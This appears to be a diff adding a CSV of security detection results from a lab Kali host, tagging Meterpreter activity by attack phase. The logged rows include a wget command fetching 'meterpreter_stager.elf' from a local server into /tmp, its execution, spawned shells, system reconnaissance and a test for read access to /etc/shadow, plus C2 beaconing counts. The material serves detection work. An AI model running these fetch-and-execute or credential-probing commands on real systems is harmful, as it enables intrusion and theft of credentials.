@@ -1,0 +1,13 @@
+"_time",host,User,Image,ParentImage,CommandLine,"attack_phase","detection_type",DestinationIp,count
+"2025-05-29T17:40:14.739+0530",kali,root,"/usr/bin/dash","/tmp/meterpreter_stager.elf","/bin/sh -c uname -n ","Phase_3: Post Exploitation - Command Execution",MeterpreterActivity,,
+"2025-05-29T17:40:14.228+0530",kali,root,"/usr/bin/dash","/tmp/meterpreter_stager.elf","/bin/sh -c command -v uname || which uname &amp;&amp; echo RNKPGNBB ","Phase_3: Post Exploitation - Command Execution",MeterpreterActivity,,
+"2025-05-29T17:40:13.413+0530",kali,root,"/usr/bin/dash","/tmp/meterpreter_stager.elf","/bin/sh -c uname -a ","Phase_3: Post Exploitation - Command Execution",MeterpreterActivity,,
+"2025-05-29T17:40:12.900+0530",kali,root,"/usr/bin/dash","/tmp/meterpreter_stager.elf","/bin/sh -c ls /etc ","Phase_3: Post Exploitation - Command Execution",MeterpreterActivity,,
+"2025-05-29T17:39:56.250+0530",kali,root,"/usr/bin/dash","/tmp/meterpreter_stager.elf","/bin/sh -c test -r '/etc/shadow' &amp;&amp; echo QPshzIlM ","Phase_3: Post Exploitation - Command Execution",MeterpreterActivity,,
+"2025-05-29T17:39:12.106+0530",kali,root,"/usr/bin/bash","/tmp/meterpreter_stager.elf","/bin/bash","Phase_3: Post Exploitation - Command Execution",MeterpreterActivity,,
+"2025-05-29T17:36:22.869+0530",kali,root,"/usr/bin/dash","/tmp/meterpreter_stager.elf","/bin/sh","Phase_3: Post Exploitation - Command Execution",MeterpreterActivity,,
+"2025-05-29T17:36:08.733+0530",kali,root,"/tmp/meterpreter_stager.elf","-","/tmp/meterpreter_stager.elf","Phase_3: Payload Execution",MeterpreterActivity,,
+"2025-05-29T17:35:31.018+0530",kali,root,"/usr/bin/wget","-","wget http://192.168.1.7:8000/meterpreter_stager.elf -O /tmp/meterpreter_stager.elf","Phase_2: Payload Download",MeterpreterActivity,,
+"2025-05-29T17:33:44.172+0530",kali,root,"/usr/bin/wget","-","wget http://192.168.1.7:8000/meterpreter_stager.elf -O /tmp/meterpreter_stager.elf","Phase_2: Payload Download",MeterpreterActivity,,
+"2025-05-28T19:22:00.000+0530",,,,,,,"C2 beaconing","192.168.1.7",4
+"2025-05-28T19:20:00.000+0530",,,,,,,"C2 beaconing","192.168.1.7",4
